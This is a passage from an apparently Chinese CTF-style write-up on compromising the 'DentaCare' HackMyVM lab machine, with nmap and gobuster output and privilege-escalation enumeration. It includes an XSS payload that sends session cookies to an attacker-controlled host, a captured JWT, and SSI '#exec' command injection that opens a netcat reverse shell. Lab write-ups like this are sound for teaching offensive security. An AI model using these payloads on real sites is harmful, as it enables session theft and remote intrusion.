SF:MT<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Type:<span class="token entity" title="\x20">\x20</span>text/html;<span class="token entity" title="\x20">\x20</span>charset=utf-8<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Length:\x
SF:2043069<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection:<span class="token entity" title="\x20">\x20</span>close<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>&lt;!DOCTYPE<span class="token entity" title="\x20">\x20</span>html><span class="token entity" title="\n">\n</span>&lt;html<span class="token entity" title="\x20">\x20</span>lan
SF:g=<span class="token entity" title="\&quot;">\"</span>en<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;head><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;title>DentaCare<span class="token entity" title="\x20">\x20</span>Corporat
SF:ion&lt;/title><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;meta<span class="token entity" title="\x20">\x20</span>charset=<span class="token entity" title="\&quot;">\"</span>utf-8<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>\
SF:x20&lt;meta<span class="token entity" title="\x20">\x20</span>name=<span class="token entity" title="\&quot;">\"</span>viewport<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\x20">\x20</span>content=<span class="token entity" title="\&quot;">\"</span>width=device-width,<span class="token entity" title="\x20">\x20</span>initi
SF:al-scale=1,<span class="token entity" title="\x20">\x20</span>shrink-to-fit=no<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;link<span class="token entity" title="\x20">\x20</span>href=<span class="token entity" title="\&quot;">\"</span>htt
SF:ps://fonts\.googleapis\.com/css\?family=Open\+Sans:300,400,500,600,700\
SF:"</span><span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x
SF:20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>.<span class="token punctuation">\</span>./static/css/open-iconic-bootstrap<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x
SF:20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>.<span class="token punctuation">\</span>./static/css/animate<span class="token punctuation">\</span>.cs
SF:s<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>.<span class="token punctuation">\</span>./static
SF:/css/owl<span class="token punctuation">\</span>.carousel<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesh
SF:eet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>.<span class="token punctuation">\</span>./static/css/owl<span class="token punctuation">\</span>.theme<span class="token punctuation">\</span>.default<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>
SF:x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>.<span class="token punctuation">\</span>./static/css/magnif
SF:ic-popup<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>
SF:<span class="token string">"\.\./static/css/aos\.css<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;lin"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>HTTPOptions,C7,<span class="token string">"
SF:HTTP/1\.1<span class="token entity" title="\x20">\x20</span>200<span class="token entity" title="\x20">\x20</span>OK<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Server:<span class="token entity" title="\x20">\x20</span>Werkzeug/3\.0\.2<span class="token entity" title="\x20">\x20</span>Python/3\.11\.
SF:2<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Date:<span class="token entity" title="\x20">\x20</span>Sun,<span class="token entity" title="\x20">\x20</span>02<span class="token entity" title="\x20">\x20</span>Jun<span class="token entity" title="\x20">\x20</span>2024<span class="token entity" title="\x20">\x20</span>13:38:53<span class="token entity" title="\x20">\x20</span>GMT<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-T
SF:ype:<span class="token entity" title="\x20">\x20</span>text/html;<span class="token entity" title="\x20">\x20</span>charset=utf-8<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Allow:<span class="token entity" title="\x20">\x20</span>HEAD,<span class="token entity" title="\x20">\x20</span>GET,<span class="token entity" title="\x20">\x20</span>OPTIO
SF:NS<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Length:<span class="token entity" title="\x20">\x20</span>0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection:<span class="token entity" title="\x20">\x20</span>close<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RTSPRequ
SF:est,16C,<span class="token string">"&lt;!DOCTYPE<span class="token entity" title="\x20">\x20</span>HTML><span class="token entity" title="\n">\n</span>&lt;html<span class="token entity" title="\x20">\x20</span>lang=<span class="token entity" title="\&quot;">\"</span>en<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;he
SF:ad><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;meta<span class="token entity" title="\x20">\x20</span>charset=<span class="token entity" title="\&quot;">\"</span>utf-8<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span>\
SF:x20<span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;title>Error<span class="token entity" title="\x20">\x20</span>response&lt;/title><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>\x
SF:20<span class="token entity" title="\x20">\x20</span>&lt;/head><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;body><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>
SF:&lt;h1>Error<span class="token entity" title="\x20">\x20</span>response&lt;/h1><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;p>Error<span class="token entity" title="\x2">\x2</span>
SF:0code:<span class="token entity" title="\x20">\x20</span>400&lt;/p><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;p>Message:<span class="token entity" title="\x20">\x20</span>Bad\x
SF:20request<span class="token entity" title="\x20">\x20</span>version<span class="token entity" title="\x20">\x20</span>\('RTSP/1\.0'\)\.&lt;/p><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>
SF:<span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;p>Error<span class="token entity" title="\x20">\x20</span>code<span class="token entity" title="\x20">\x20</span>explanation:<span class="token entity" title="\x20">\x20</span>400<span class="token entity" title="\x20">\x20</span>-<span class="token entity" title="\x20">\x20</span>Bad<span class="token entity" title="\x20">\x20</span>request\
SF:x20syntax<span class="token entity" title="\x20">\x20</span>or<span class="token entity" title="\x20">\x20</span>unsupported<span class="token entity" title="\x20">\x20</span>method\.&lt;/p><span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;/body>
SF:<span class="token entity" title="\n">\n</span>&lt;/html><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
MAC Address: 08:00:27:EB:B5:D0 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: <span class="token number">127.0</span>.1.1<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.68</span> ms <span class="token number">192.168</span>.56.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">96.40</span> seconds</code></pre>
<p>开启了22 80 8000三个端口<br>去看看web</p>
<h2 id="web信息收集"><a href="#web信息收集" class="headerlink" title="web信息收集"></a>web信息收集</h2><p><img src="https://ooo.0x0.ooo/2024/06/02/OJEOtU.png" alt="OJEOtU.png" loading="lazy"><br>看一下源码<br>看到一个域名<code>dentacare.hmv</code>,先添加到hosts先。<br>界面乱点一通，没发现有用的功能点，扫下目录。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://dentacare.hmv/ -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://dentacare.hmv/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">43069</span><span class="token punctuation">]</span>
/contact              <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">27322</span><span class="token punctuation">]</span>
/about                <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22975</span><span class="token punctuation">]</span>
/blog                 <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">23021</span><span class="token punctuation">]</span>
/services             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">21296</span><span class="token punctuation">]</span>
/admin                <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">189</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /<span class="token punctuation">]</span>
/comment              <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">153</span><span class="token punctuation">]</span>
/console              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1563</span><span class="token punctuation">]</span>
Progress: <span class="token number">22436</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">1.70</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">22545</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">1.70</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>发现有终端，去看看<br><img src="https://ooo.0x0.ooo/2024/06/02/OJEqWv.png" alt="OJEqWv.png" loading="lazy"><br>需要pin码，计算pin需要6个值，但是试了好久没找到LFI的点。<br>迫不得已，看了wp，发现是利用XSS，国外好像很喜欢在web用xss，前几天国外ctf的web好几个xss<br>用xss获取cookie<br><img src="https://ooo.0x0.ooo/2024/06/02/OJE5gq.png" alt="OJE5gq.png" loading="lazy"></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"http://192.168.56.104:6677/?cookie="</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span> 
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p>然后kali开个http服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># python -m http.server 6677         </span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">6677</span> <span class="token punctuation">(</span>http://0.0.0.0:6677/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">GET /?cookie<span class="token operator">=</span>Authorization<span class="token operator">=</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ HTTP/1.1
Host: <span class="token number">192.168</span>.56.104:6677
Connection: keep-alive
Upgrade-Insecure-Requests: <span class="token number">1</span>
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> HeadlessChrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span></code></pre>
<p>eyJ开头一眼JWT<br><img src="https://ooo.0x0.ooo/2024/06/02/OJEBsc.png" alt="OJEBsc.png" loading="lazy"><br>看起来似乎不用伪造，拿去访问一下8000端口</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="https://ooo.0x0.ooo/2024/06/02/OJEWrM.png" alt="OJEWrM.png" loading="lazy"><br>尝试一下RCE<br><img src="https://ooo.0x0.ooo/2024/06/02/OJEbGG.png" alt="OJEbGG.png" loading="lazy"><br>没成功，但是拿到一个新目录<code>patient_name.shtml</code><br>搜索一番shtml发现可以通过<code>&lt;!--#exec cmd=&quot;&quot; --&gt;</code>执行命令</p>
<pre class="language-shtml" data-language="shtml"><code class="language-shtml">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/02/OJEk31.png" alt="OJEk31.png" loading="lazy"><br>确实可以rce，反弹一下shell</p>
<pre class="language-shtml" data-language="shtml"><code class="language-shtml">&lt;!--#exec cmd&#x3D;&quot; nc 192.168.56.104 4567 -e &#x2F;bin&#x2F;bash&quot; --&gt;</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/var/www$ <span class="token function">id</span> 
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>home下有一个用户dentist，不过无权访问</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root    root    <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root    root    <span class="token number">4096</span> Mar  <span class="token number">9</span> <span class="token number">12</span>:28 <span class="token punctuation">..</span>
drwx------  <span class="token number">4</span> dentist dentist <span class="token number">4096</span> Apr <span class="token number">12</span> <span class="token number">20</span>:04 dentist
www-data@dentacare:/home$ <span class="token builtin class-name">cd</span> dentist
bash: cd: dentist: Permission denied</code></pre>
<p>简单先找吧<br>SUID，无</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/home$ <span class="token builtin class-name">cd</span> dentist
bash: cd: dentist: Permission denied
www-data@dentacare:/home$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/authbind/helper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper</code></pre>
<p>sudo，无</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> www-data: 
Sorry, try again.
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> www-data: 
Sorry, try again.
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> www-data: 
sudo: <span class="token number">3</span> incorrect password attempts</code></pre>
<p>定时任务，无</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@dentacare:/home$ <span class="token function">cat</span> /etc/crontab
<span class="token comment"># /etc/crontab: system-wide crontab</span>
<span class="token comment"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="token comment"># command to install the new version when you edit this file</span>
<span class="token comment"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="token comment"># that none of the other crontabs do.</span>

<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="token comment"># Example of job definition:</span>
<span class="token comment"># .---------------- minute (0 - 59)</span>
<span class="token comment"># |  .------------- hour (0 - 23)</span>
<span class="token comment"># |  |  .---------- day of month (1 - 31)</span>
<span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
